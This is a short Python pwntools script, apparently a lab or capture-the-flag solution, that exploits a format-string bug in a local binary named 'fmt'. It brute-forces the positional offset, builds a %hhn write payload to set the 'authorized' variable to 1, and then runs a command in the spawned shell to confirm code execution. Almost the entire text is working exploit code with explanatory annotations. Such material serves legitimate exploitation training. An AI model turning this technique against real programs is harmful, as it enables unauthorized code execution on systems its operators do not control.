#!/usr/bin/env python3
"""Turn the printf(buf) bug into an arbitrary write: set authorized = 1."""
from pwn import *

exe = args.BIN or './fmt'
elf = context.binary = ELF(exe, checksec=False)
AUTH = elf.symbols['authorized']          # ❶ -no-pie: address is fixed

def find_offset(marker=b'BBBBBBBB'):       # ❷ discover our positional index
    for i in range(1, 40):
        io = process(exe); io.recvline()
        io.sendline(marker + b'%%%d$p' % i)
        leak = io.recvline(); io.close()
        if b'0x4242424242424242' in leak:
            return i
    raise RuntimeError('offset not found')

offset = find_offset()
log.info('controlled argument at offset %d', offset)

io = process(exe)
io.recvline()
payload = fmtstr_payload(offset, {AUTH: 1})   # ❸ byte-wise %hhn, built for us
io.sendline(payload)

io.recvuntil(b'spawning shell')               # ❹ we took the win branch
io.sendline(b'echo PWNED=$(id -u)')           # ❺ the spawned shell runs our command
io.recvuntil(b'PWNED=')
log.success('format string -> arbitrary write -> code execution (uid %s)'
            % io.recvline().strip().decode())
io.close()
